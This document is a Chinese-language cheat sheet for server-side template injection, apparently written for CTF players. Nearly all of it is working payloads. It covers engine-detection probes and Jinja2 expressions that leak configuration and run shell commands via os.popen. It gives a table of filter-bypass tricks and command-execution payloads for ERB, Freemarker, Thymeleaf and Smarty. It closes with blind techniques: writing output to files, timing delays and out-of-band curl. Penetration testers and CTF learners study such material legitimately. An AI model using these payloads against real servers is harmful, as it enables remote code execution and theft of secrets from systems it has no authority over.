# 模板注入（SSTI）

## 探测：先认引擎

```
{{7*7}}        Jinja2 / Twig / Nunjucks → 49
${7*7}         Freemarker / JSP EL / Thymeleaf → 49
<%= 7*7 %>     ERB / EJS → 49
#{7*7}         Ruby / Thymeleaf
{{7*'7'}}      Jinja2 → 7777777 ; Twig → 49   （区分器）
a{*comment*}b  Smarty
```

**判定要点**：`49` 出现在响应里才算；如果 `{{7*7}}` 原样回显，说明该位置不渲染。
如果 `{{` 被过滤，试 `{%`、`${`、`#{`、`%{`、`*{`。

## Jinja2（最常见）

```jinja
{{config}}                                    # 泄露配置/密钥
{{self.__init__.__globals__.__builtins__}}
{{''.__class__.__mro__[1].__subclasses__()}}  # 找 subprocess.Popen 索引
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''|attr('__class__')|attr('__mro__')|last|attr('__subclasses__')()}}
```

过滤绕过：

| 过滤 | 绕过 |
|---|---|
| `.` 被拦 | `|attr('...')`、`['__class__']` |
| `_` 被拦 | `request['args']`、`{{''.__class__}}`→`{{''|attr(('_'*2)+'class'+('_'*2))}}` |
| 引号被拦 | `request.args.x`、`{%set x=...%}` |
| 关键字被拦 | `{%print%}`、`|join`、字符串拼接 `'p'+'open'` |

## 其他引擎速查

```ruby
# ERB
<%= system('id') %>
<%= `id` %>
# Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
// Thymeleaf
${T(java.lang.Runtime).getRuntime().exec('id')}
// Smarty
{php}system('id');{/php}    {system('id')}
```

## 无回显时

- 把结果写进可访问文件：`{{...os.popen('id>/app/static/x.txt')}}`
- 时间盲注：`{{...os.popen('sleep 3')}}`
- 出网：`curl` 到你控制的地址（题目通常禁出网，优先本地回显）
